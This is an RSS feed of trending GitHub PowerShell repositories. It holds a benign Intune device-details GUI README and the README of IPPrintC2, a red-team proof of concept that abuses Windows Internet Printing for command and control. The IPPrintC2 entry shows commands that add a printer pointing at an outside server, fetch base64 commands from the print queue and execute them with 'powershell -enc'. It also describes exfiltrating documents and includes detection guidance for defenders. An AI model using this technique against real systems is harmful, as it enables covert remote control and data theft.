<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-05-12T01:35:15Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>petripaavola/IntuneDeviceDetailsGUI</title>
    <updated>2024-05-12T01:35:15Z</updated>
    <id>tag:github.com,2024-05-12:/petripaavola/IntuneDeviceDetailsGUI</id>
    <link href="https://github.com/petripaavola/IntuneDeviceDetailsGUI" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Intune Device Details GUI&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Intune Device Details GUI ver. 2.98 (updated 2024-05-09)&lt;/h1&gt; &#xA;&lt;h3&gt;Note! Script uses now Microsoft.Graph.Authentication module&lt;/h3&gt; &#xA;&lt;p&gt;Go to script &lt;a href=&#34;https://raw.githubusercontent.com/petripaavola/IntuneDeviceDetailsGUI/main/IntuneDeviceDetailsGUI.ps1&#34;&gt;IntuneDeviceDetailsGUI.ps1&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Version 2.98 update to Microsoft Graph module.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Script uses now Microsoft.Graph.Authentication Powershell module&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You can install Microsoft Graph module with command: &lt;strong&gt;Install-Module -Name Microsoft.Graph.Authentication -Scope CurrentUser&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Script uses only Read Scopes for Graph API&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;New feature to show &lt;strong&gt;Bitlocker Recovery Keys&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;New feature to show &lt;strong&gt;Windows LAPS Password&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Device group memberships shows also nested groups memberships which will help show Application and Configuration target groups&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Version 2.974 is another bigger update.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;There was bug in Configuration Profiles processing so make sure to update to this newer version (it limited to 50 policies).&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;You can now see &lt;strong&gt;impact&lt;/strong&gt; of Assignments meaning you can see number of users and/or devices affected by Assignment.&lt;/li&gt; &#xA; &lt;li&gt;You can also select logged on user to show Application assignments to.&lt;/li&gt; &#xA; &lt;li&gt;Something small but also really big on it&#39;s own way. Mouse cursor changes to busy while searching :)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Version 2.95 is a huge update to the script&#39;s functionalities. Built-in search helps using this tool a lot.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This Windows Powershell based GUI/report helps Intune admins to see Intune device data in one view&lt;/p&gt; &#xA;&lt;p&gt;Especially it shows what &lt;strong&gt;Azure AD Groups and Intune filters&lt;/strong&gt; are used in Application and Configuration Assignments.&lt;/p&gt; &#xA;&lt;p&gt;Assignment group information helps admins to understand why apps and configurations are targeted to devices and find possible bad assignments.&lt;/p&gt; &#xA;&lt;h3&gt;GUI view&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/petripaavola/IntuneDeviceDetailsGUI/raw/main/pics/IntuneDeviceDetailsGUI_v2.95.gif&#34; alt=&#34;IntuneDeviceDetailsGUI_v2.95.gif&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Search&lt;/strong&gt; with free keyword or use built-in Quick Filters &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Keyword search with device name, serial, user email address, operating system, deviceId&lt;/li&gt; &#xA;   &lt;li&gt;searching with user email address also shows devices where user has logged-in (this is not shown in MEM/Intune search)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Show Application Assignments with AzureAD Groups and Filters information&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Show Configurations Assignments with AzureAD Groups and Filters information&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Show Bitlocker Recovery Keys&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Show Windows LAPS Password&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Highlight assignment states with colors to easily see what is happening &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;For example highlight Not Applicable application assignment with yellow and usually you notice that Filter is reason for Not Applicable state&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Show Recently logged in user(s)&lt;/li&gt; &#xA; &lt;li&gt;Show OS Version support dates&lt;/li&gt; &#xA; &lt;li&gt;Show Device Group Memberships and membership rules&lt;/li&gt; &#xA; &lt;li&gt;Show Primary User Group Memberships and membership rules&lt;/li&gt; &#xA; &lt;li&gt;Show Latest Signed-In User Group Memberships and membership rules&lt;/li&gt; &#xA; &lt;li&gt;Intune JSON information on right side (this helps to understand what data there is inside Intune)&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hover on&lt;/strong&gt; to get ToolTip on Device, PrimaryUser, Latest logged-in user, Group, Application, Configuration, AssignmentGroup, Filter and many other places to get more information &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;There is lot of work done to get these (hover) ToolTips to show relevant information in easily readable format&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Right click menus&lt;/strong&gt; to &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Copy data to clipboard&lt;/li&gt; &#xA;   &lt;li&gt;Copy Dynamic Azure AD Group Membership rules to clipboard&lt;/li&gt; &#xA;   &lt;li&gt;Open specific resource in MEM/Intune web UI (device, autopilot device, user, group, application)&lt;/li&gt; &#xA;   &lt;li&gt;Copy Win32 Application custom detection and requirement scripts&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Script uses caching a lot. All used data is automatically downloaded once a day and during the day delta checks are done to Intune data &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Idea is to use cached data but still every time double check that there are no changes in Intune&lt;/li&gt; &#xA;   &lt;li&gt;This saves Graph API bandwidth but still makes sure that data relevant (real time)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Show Autopilot information &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Applied Autopilot deployment profile&lt;/li&gt; &#xA;   &lt;li&gt;Applied Enrollment Status Page&lt;/li&gt; &#xA;   &lt;li&gt;Applied Enrollment Restrictions&lt;/li&gt; &#xA;   &lt;li&gt;Autopilot Deployment Profile JSON&lt;/li&gt; &#xA;   &lt;li&gt;Autopilot device JSON&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Support for Shared devices &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Search with user email address and get devices where user has logged in&lt;/li&gt; &#xA;   &lt;li&gt;Latest logged in user information ToolTip (hover on)&lt;/li&gt; &#xA;   &lt;li&gt;Latest logged in user Azure AD Group memberships (and membeship rules)&lt;/li&gt; &#xA;   &lt;li&gt;Application and Configuration assignment are checked against latest logged in user&#39;s group memberships (if there is no PrimaryUser in device)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;Prerequisities:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Run script in &lt;strong&gt;Windows Powershell&lt;/strong&gt;. Windows Presentations Framework (WPF) based GUIs donÂ´t work with Powershell core.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Make sure you have installed Microsoft.Graph.Authentication module and allow running Powershell scripts&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Install Microsoft.Graph.Authentication module&#xA;Install-Module -Name Microsoft.Graph.Authentication -Scope CurrentUser&#xA;&#xA;# Allow running Powershell scripts&#xA;&#xA;# This allows running all signed scripts for current user&#xA;# This shows warning if script is not signed&#xA;Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser&#xA;&#xA;# This allows running all scripts for current user&#xA;Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Running the script&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;.\IntuneDeviceDetailsGUI.ps1&#xA;.\IntuneDeviceDetailsGUI.ps1 -Verbose&#xA;&#xA;.\IntuneDeviceDetailsGUI.ps1 -Id 2e6e1d5f-b18a-44c6-989e-9bbb1efafbff&#xA;.\IntuneDeviceDetailsGUI.ps1 -IntuneDeviceId 2e6e1d5f-b18a-44c6-989e-9bbb1efafbff&#xA;&#xA;# Pipe Intune objects to script&#xA;Get-IntuneManagedDevice -Filter &#34;devicename eq &#39;MyLoveMostPC&#39;&#34; | .\IntuneDeviceDetailsGUI.ps1&#xA;&#xA;# Or create Device Management UI with Out-GridView&#xA;# Show devices in Out-GridView and for selected device show IntuneDeviceDetailsGUI&#xA;Get-IntuneManagedDevice | Out-GridView -OutputMode Single | .\IntuneDeviceDetailsGUI.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Intune user permissions needed to run this script&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Script uses user login so login with user who has at least &lt;strong&gt;read permissions&lt;/strong&gt; to Intune and permissions to use Intune Powershell module&lt;/li&gt; &#xA; &lt;li&gt;Script does only GET operations and 2 POST operations (to get Intune report) so at this time this is read only tool&lt;/li&gt; &#xA; &lt;li&gt;For most restrictive permissions this script has been tested even with &lt;strong&gt;Intune Read Only Operators role&lt;/strong&gt; and script works with that role also&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Future possible plans&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Never ever create Powershell UIs without using syncHash and multiple threads &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This script was originally part of multithreaded tool so syncHash was not used inside this script and threading was done outside this script&lt;/li&gt; &#xA;   &lt;li&gt;Now this tool is self containing so in the next major version update syncHash and threading needs to be implemented to create responsive UI&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Integrate my other Application and Configuration Assignment reports into this toolset&lt;/li&gt; &#xA; &lt;li&gt;Create other views to show information about users, Azure AD Groups, Applications and Configurations&lt;/li&gt; &#xA; &lt;li&gt;Any other feature requests ?-)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This tool is provided &#34;AS IS&#34; without any warranties so please evaluate it in test environment before production use. It is provided as Powershell script so there is no closed code and you can evaluate everything it does. Trust is important when using Administrative user rights and tools in your production environment. I use this tool daily in production environments I manage myself.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Diverto/IPPrintC2</title>
    <updated>2024-05-12T01:35:15Z</updated>
    <id>tag:github.com,2024-05-12:/Diverto/IPPrintC2</id>
    <link href="https://github.com/Diverto/IPPrintC2" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PoC for using MS Windows printers for persistence / command and control via Internet Printing&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;IPPrint C2&lt;/h1&gt; &#xA;&lt;h3&gt;TL;DR&lt;/h3&gt; &#xA;&lt;p&gt;A Proof-of-Concept for using Microsoft Windows printers for persistence / command and control via Internet Printing.&lt;/p&gt; &#xA;&lt;p&gt;Printing systems are an often overlooked target for attackers looking to establish command and control (C2) channels on a victim&#39;s network. An attacker can abuse the operating system&#39;s printing system to add and remove printers and create and manipulate printing jobs to achieve full C2 communication. We have developed a complete proof of concept of such a solution that we have successfully tested in real-world red teaming exercises. By understanding the approach taken in this specific abuse of printing systems, we can take steps to secure them and prevent them from being exploited by malicious actors.&lt;/p&gt; &#xA;&lt;h3&gt;Background story&lt;/h3&gt; &#xA;&lt;p&gt;The idea was to create a basic C2 for engagements using built-in Windows functionalities, which can then be used to execute arbitrary commands or load a preferable C2 solution (&lt;a href=&#34;https://howto.thec2matrix.com/&#34;&gt;https://howto.thec2matrix.com/&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;A feature in Microsoft Windows was used that enables to install of shared printers through Internet Printing Protocol (&lt;a href=&#34;https://en.wikipedia.org/wiki/Internet_Printing_Protocol&#34;&gt;https://en.wikipedia.org/wiki/Internet_Printing_Protocol&lt;/a&gt;). Regular users can add a printer without administrative privileges as long there is no driver installation, so usage of existing drivers was mandatory. A default &#34;Microsoft Print to PDF&#34; driver was used.&lt;/p&gt; &#xA;&lt;p&gt;The commands that will be executed are sent from the C2 Internet Printing server to the printer&#39;s document queue as base64-encoded document names. With basic PowerShell, clients can then obtain these document names from the queue and execute commands on themselves. Also, clients can print documents to this printer that will be saved to a file on the C2 server which is useful to fetch results from executed commands or to exfiltrate documents. An additional plus was that adding a printer shared on the Internet passed through a couple of web proxy solutions commonly used in enterprises. Tested on Windows Server 2019 and Windows 10 / 11.&lt;/p&gt; &#xA;&lt;h3&gt;Server&lt;/h3&gt; &#xA;&lt;p&gt;Internet Information Services, Windows Print Services, Print Server and Internet Printing are required to set up a C2 server. Anonymous authentication is enabled on Internet Information Services so clients can obtain the document queue without authentication and the owner of print jobs is the IUSR user account. The server also installs the shared printer for itself and uses it to submit jobs to its print queue, otherwise, the document owner would not be the IUSR user and clients would not be able to obtain the document name from the queue.&lt;/p&gt; &#xA;&lt;p&gt;The installation script is provided in this repository and should work. Check if you can access your printer to make sure everything went well:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http(s)://&amp;lt;IP or DNS&amp;gt;/printers/&#xA;http(s)://&amp;lt;IP or DNS&amp;gt;/printers/&amp;lt;printername&amp;gt;/.printer&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Once all is set up, run the IPPrintC2.ps1 and enter commands that you would like to execute on the client through the document name. The document name has its length limitations, so if the length of the base64 encoded command in the document name is larger than 255 characters, it gets split to several documents in the print queue. This is handled by the IPPrintC2 script while the concatenation is handled by the client.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Users\administrator\Desktop&amp;gt; .\IPPrintC2.ps1&#xA;IPPrint C2 Server&#xA;1. Select the default C2 printer.&#xA;2. Enter the command to execute on the client through the document name.&#xA;3. Enter the path of the PowerShell script you would like to execute.&#xA;4. Exfiltrate remote documents.&#xA;5. Read IIS logs.&#xA;6. Clear the print queue.&#xA;7. Kill all clients.&#xA;8. Quit.&#xA;What do you want to do?: 2&#xA;To print output of multiple commands, use this: [scriptblock]$x={whoami;hostname;ipconfig};$x.invoke()&#xA;Enter commands you wish to execute: [scriptblock]$x={whoami /all;hostname};$x.invoke()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can also load PowerShell scripts. Keep the scripts simple as they may take a while to get split and sent to the document queue. Also, the scripts are one-off since the print queue eventually gets cleared and the character limit is 32767.&lt;/p&gt; &#xA;&lt;h4&gt;OpSec&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Be sure to use the whitelist approach for the network segments you are targeting, otherwise anyone can access your print queue.&lt;/li&gt; &#xA; &lt;li&gt;It is recommended to set up SSL for obvious reasons. The easiest way to setup SSL: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Setup / generate a DNS record for your VM&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://certifytheweb.com/&#34;&gt;https://certifytheweb.com/&lt;/a&gt; can be used to automate CSR and installation&lt;/li&gt; &#xA;   &lt;li&gt;Make sure to edit site bindings under IIS to enable HTTPS and disable HTTP&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/iis/manage/configuring-security/how-to-set-up-ssl-on-iis&#34;&gt;https://docs.microsoft.com/en-us/iis/manage/configuring-security/how-to-set-up-ssl-on-iis&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Client&lt;/h3&gt; &#xA;&lt;p&gt;To execute commands on the client, the addition of a printer and a persistent job to obtain and execute commands is needed. Examples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Users\regular&amp;gt; Add-Printer XPS -PortName https://somewhere.on.azure.com/printers/af/.printer -DriverName &#34;Microsoft Print To PDF&#34;&#xA;&#xA;PS C:\Users\regular&amp;gt; Get-Printer XPS |fl&#xA;&#xA;&#xA;Name                         : XPS&#xA;ComputerName                 :&#xA;Type                         : Local&#xA;ShareName                    :&#xA;PortName                     : https://somewhere.on.azure.com/printers/af/.printer&#xA;DriverName                   : Microsoft Print To PDF&#xA;Location                     :&#xA;Comment                      :&#xA;SeparatorPageFile            :&#xA;PrintProcessor               : winprint&#xA;Datatype                     : RAW&#xA;Shared                       : False&#xA;Published                    : False&#xA;DeviceType                   : Print&#xA;PermissionSDDL               :&#xA;RenderingMode                :&#xA;KeepPrintedJobs              : False&#xA;Priority                     : 1&#xA;DefaultJobPriority           : 0&#xA;StartTime                    : 0&#xA;UntilTime                    : 0&#xA;PrinterStatus                : Normal&#xA;JobCount                     : 0&#xA;DisableBranchOfficeLogging   :&#xA;BranchOfficeOfflineLogSizeMB :&#xA;WorkflowPolicy               :&#xA;&#xA;PS C:\Users\regular&amp;gt; ((get-printjob XPS).documentname -join &#34;&#34;)&#xA;WwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQAkAHgAPQB7AHcAaABvAGEAbQBpACAALwBhAGwAbAA7AGgAbwBzAHQAbgBhAG0AZQB9ADsAJAB4AC4AaQBuAHYAbwBrAGUAKAApAA==&#xA;&#xA;PS C:\Users\regular&amp;gt; powershell -enc ((get-printjob XPS).documentname -join &#34;&#34;)&#xA;&#xA;USER INFORMATION&#xA;----------------&#xA;&#xA;User Name               SID&#xA;======================= ==============================================&#xA;desktop-printingfun\regular S-1-5-21-1829223926-2430627930-1039442773-1002&#xA;&#xA;&#xA;GROUP INFORMATION&#xA;-----------------&#xA;&#xA;Group Name                             Type             SID          Attributes&#xA;====================================== ================ ============ ==================================================&#xA;Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group&#xA;BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group&#xA;BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group&#xA;NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group&#xA;CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group&#xA;NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group&#xA;NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group&#xA;NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group&#xA;LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group&#xA;NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group&#xA;Mandatory Label\Medium Mandatory Level Label            S-1-16-8192&#xA;&#xA;&#xA;PRIVILEGES INFORMATION&#xA;----------------------&#xA;&#xA;Privilege Name                Description                          State&#xA;============================= ==================================== ========&#xA;SeShutdownPrivilege           Shut down the system                 Disabled&#xA;SeChangeNotifyPrivilege       Bypass traverse checking             Enabled&#xA;SeUndockPrivilege             Remove computer from docking station Disabled&#xA;SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled&#xA;SeTimeZonePrivilege           Change the time zone                 Disabled&#xA;&#xA;DESKTOP-PRINTINGFUN&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Several payloads are available in the repository.&lt;/p&gt; &#xA;&lt;h3&gt;Detection&lt;/h3&gt; &#xA;&lt;p&gt;As always, the best way is to centrally monitor the logs of the infrastructure on your Security Operations Center / Security Information and Event Management solutions and use command-line logging / PowerShell Transcription.&lt;/p&gt; &#xA;&lt;p&gt;By default, printer installation is not logged in the Event Viewer, but this can be enabled:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Event Viewer -&amp;gt; Application and Services Logs -&amp;gt; Microsoft -&amp;gt; Windows -&amp;gt; PrintService, right-click and enable the Operational log &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint&#34;&gt;https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;With Print Service Operational log enabled you can monitor the installation of printers and additional information with Event ID&#39;s 300 and 307.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Log Name:      Microsoft-Windows-PrintService/Operational&#xA;Source:        Microsoft-Windows-PrintService&#xA;Date:          6/28/2022 9:15:42 AM&#xA;Event ID:      300&#xA;Task Category: Adding a printer&#xA;Level:         Information&#xA;Keywords:      Classic Spooler Event,Printer&#xA;User:          DESKTOP-PRINTINGFUN\regular&#xA;Computer:      DESKTOP-PRINTINGFUN&#xA;Description:&#xA;Printer XPS was created. No user action is required.&#xA;Event Xml:&#xA;&amp;lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&amp;gt;&#xA;  &amp;lt;System&amp;gt;&#xA;    &amp;lt;Provider Name=&#34;Microsoft-Windows-PrintService&#34; Guid=&#34;{747ef6fd-e535-4d16-b510-42c90f6873a1}&#34; /&amp;gt;&#xA;    &amp;lt;EventID&amp;gt;300&amp;lt;/EventID&amp;gt;&#xA;    &amp;lt;Version&amp;gt;0&amp;lt;/Version&amp;gt;&#xA;    &amp;lt;Level&amp;gt;4&amp;lt;/Level&amp;gt;&#xA;    &amp;lt;Task&amp;gt;4&amp;lt;/Task&amp;gt;&#xA;    &amp;lt;Opcode&amp;gt;11&amp;lt;/Opcode&amp;gt;&#xA;    &amp;lt;Keywords&amp;gt;0x4000000000000820&amp;lt;/Keywords&amp;gt;&#xA;    &amp;lt;TimeCreated SystemTime=&#34;2022-06-28T07:15:42.7786608Z&#34; /&amp;gt;&#xA;    &amp;lt;EventRecordID&amp;gt;6&amp;lt;/EventRecordID&amp;gt;&#xA;    &amp;lt;Correlation /&amp;gt;&#xA;    &amp;lt;Execution ProcessID=&#34;2512&#34; ThreadID=&#34;2824&#34; /&amp;gt;&#xA;    &amp;lt;Channel&amp;gt;Microsoft-Windows-PrintService/Operational&amp;lt;/Channel&amp;gt;&#xA;    &amp;lt;Computer&amp;gt;DESKTOP-PRINTINGFUN&amp;lt;/Computer&amp;gt;&#xA;    &amp;lt;Security UserID=&#34;S-1-5-21-1829223926-2430127930-1039111773-1002&#34; /&amp;gt;&#xA;  &amp;lt;/System&amp;gt;&#xA;  &amp;lt;UserData&amp;gt;&#xA;    &amp;lt;PrinterCreated xmlns=&#34;http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events&#34;&amp;gt;&#xA;      &amp;lt;Param1&amp;gt;XPS&amp;lt;/Param1&amp;gt;&#xA;    &amp;lt;/PrinterCreated&amp;gt;&#xA;  &amp;lt;/UserData&amp;gt;&#xA;&amp;lt;/Event&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Log Name:      Microsoft-Windows-PrintService/Operational&#xA;Source:        Microsoft-Windows-PrintService&#xA;Date:          6/28/2022 11:15:16 AM&#xA;Event ID:      307&#xA;Task Category: Printing a document&#xA;Level:         Information&#xA;Keywords:      Classic Spooler Event,Document Print Job&#xA;User:          DESKTOP-PRINTINGFUN\regular&#xA;Computer:      DESKTOP-PRINTINGFUN&#xA;Description:&#xA;Document 4, Print Document owned by regular on \\DESKTOP-PRINTINGFUN was printed on XPS through port https://somewhere.on.azure.com/printers/printers/af/.printer.  Size in bytes: 69009. Pages printed: 1. No user action is required.&#xA;Event Xml:&#xA;&amp;lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&amp;gt;&#xA;  &amp;lt;System&amp;gt;&#xA;    &amp;lt;Provider Name=&#34;Microsoft-Windows-PrintService&#34; Guid=&#34;{747ef6fd-e535-4d16-b510-42c90f6873a1}&#34; /&amp;gt;&#xA;    &amp;lt;EventID&amp;gt;307&amp;lt;/EventID&amp;gt;&#xA;    &amp;lt;Version&amp;gt;0&amp;lt;/Version&amp;gt;&#xA;    &amp;lt;Level&amp;gt;4&amp;lt;/Level&amp;gt;&#xA;    &amp;lt;Task&amp;gt;26&amp;lt;/Task&amp;gt;&#xA;    &amp;lt;Opcode&amp;gt;11&amp;lt;/Opcode&amp;gt;&#xA;    &amp;lt;Keywords&amp;gt;0x4000000000000840&amp;lt;/Keywords&amp;gt;&#xA;    &amp;lt;TimeCreated SystemTime=&#34;2022-06-28T09:15:16.1668381Z&#34; /&amp;gt;&#xA;    &amp;lt;EventRecordID&amp;gt;97&amp;lt;/EventRecordID&amp;gt;&#xA;    &amp;lt;Correlation /&amp;gt;&#xA;    &amp;lt;Execution ProcessID=&#34;2512&#34; ThreadID=&#34;1848&#34; /&amp;gt;&#xA;    &amp;lt;Channel&amp;gt;Microsoft-Windows-PrintService/Operational&amp;lt;/Channel&amp;gt;&#xA;    &amp;lt;Computer&amp;gt;DESKTOP-PRINTINGFUN&amp;lt;/Computer&amp;gt;&#xA;    &amp;lt;Security UserID=&#34;S-1-5-21-1829223926-2430127930-1039111773-1002&#34; /&amp;gt;&#xA;  &amp;lt;/System&amp;gt;&#xA;  &amp;lt;UserData&amp;gt;&#xA;    &amp;lt;DocumentPrinted xmlns=&#34;http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events&#34;&amp;gt;&#xA;      &amp;lt;Param1&amp;gt;4&amp;lt;/Param1&amp;gt;&#xA;      &amp;lt;Param2&amp;gt;Print Document&amp;lt;/Param2&amp;gt;&#xA;      &amp;lt;Param3&amp;gt;regular&amp;lt;/Param3&amp;gt;&#xA;      &amp;lt;Param4&amp;gt;\\DESKTOP-PRINTINGFUN&amp;lt;/Param4&amp;gt;&#xA;      &amp;lt;Param5&amp;gt;XPS&amp;lt;/Param5&amp;gt;&#xA;      &amp;lt;Param6&amp;gt;https://somewhere.on.azure.com/printers/af/.printer&amp;lt;/Param6&amp;gt;&#xA;      &amp;lt;Param7&amp;gt;69009&amp;lt;/Param7&amp;gt;&#xA;      &amp;lt;Param8&amp;gt;1&amp;lt;/Param8&amp;gt;&#xA;    &amp;lt;/DocumentPrinted&amp;gt;&#xA;  &amp;lt;/UserData&amp;gt;&#xA;&amp;lt;/Event&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Files&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install/InstallScript.ps1 - PowerShell script that installs the prerequisites. You should set up SSL yourself&lt;/li&gt; &#xA; &lt;li&gt;Server/IPPrintC2.ps1 - PowerShell script for IPPrintC2 that you run on the server hosting Print Services&lt;/li&gt; &#xA; &lt;li&gt;Payloads/payloads.txt - basic list of payloads to get started&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Notes&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The C2 currently works as one-to-all. You can set up additional printers on the C2 server, modify the IPPrintC2.ps1 script, and run multiple instances&lt;/li&gt; &#xA; &lt;li&gt;Exfiltration of documents needs improvement as it currently works with ASCII text-based files&lt;/li&gt; &#xA; &lt;li&gt;Automatic cleaning of documents printed by clients requires improvements&lt;/li&gt; &#xA; &lt;li&gt;The IPPrintC2 is provided as-is&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;In the process of writing this simple C2, it was discovered that a somewhat similar technique was also used by WithSecure and published earlier. Not only that, but the name (PrintC2) also was the same, so it was changed to IPPrintC2. Nevertheless, due to the differences and different initial mindset/purpose we decided to release our work.&lt;/p&gt; &#xA;&lt;h3&gt;References&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Diverto/IPPrintC2&#34;&gt;https://github.com/Diverto/IPPrintC2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://windows-internals.com/printdemon-cve-2020-1048/&#34;&gt;https://windows-internals.com/printdemon-cve-2020-1048/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; 